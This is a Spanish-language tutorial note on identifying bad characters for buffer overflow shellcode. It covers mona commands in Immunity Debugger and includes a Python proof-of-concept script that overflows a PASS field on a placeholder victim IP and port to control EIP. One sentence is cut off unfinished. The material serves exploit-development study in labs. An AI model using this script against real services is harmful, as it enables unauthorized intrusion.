#BufferOverflow #Bytearray #Badchars #ShellCode 

A la hora de generar nuestro *ShellCode* para explotar el bufferoverflow es posible que algunos caracteres no sean interpretados correctamente estos son conocidos como *Badchars*.
Ahora en nuestra pila donde inyectamos el shellcode haremos las pruebas para identificar estos caracteres no deseados.


Con la herramienta de `mona` en Inmunity seleccionaremos nuestra ruta de trabajo `!mona config -set workingfolder C:\Users\<Usuario>\Desktop\Analysis`
Ahora generaremos un *bytearray* `!mona bytearray -cpb '\x00'` excluyendo el nullbyte
Este *bytearray* es el que 

00.-
```python
	#!/usr/bin/python3
	
	import socket
	import sys
	
	#Variables globales
	ip_adress = <IP_Victima>
	port = <Puerto>
	offset = 4654 #Ofset que nos ha dado metasploit
	
	before_eip = b"A"*offset #Cadena de A antes de llegar al offset(valor del EIP)
	eip = b"B"*4 #Cadena con el valor del EIP, es *4 por que es la capacidad del registro EIP
	after_eip = b"C"*200 #Cadena para ver donde se almacenan los demas valores en la pila despues del EIP
	
	payload = before_eip + eip + after_eip
	
	#Exploit
	def exploit():
		
		#Crar socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		#Conectar con el servidor
		s.connect((ip_adress, port))
		
		#Recibir la respuest(banner)
		banner = s.recv(1024)
		
		s.send(b"USER test" + b'\r\n') #Enviamos un usuario en el campo USER aleatorio en este caso TEST
		response = s.recv(1024)
		s.send(b"PASS " + payload + b'\r\n') #En el campo PASS introducira el payload que es igual a 4654 + eip
		s.close()
		
	if __name__ == '__main__':
		
		exploit()
		
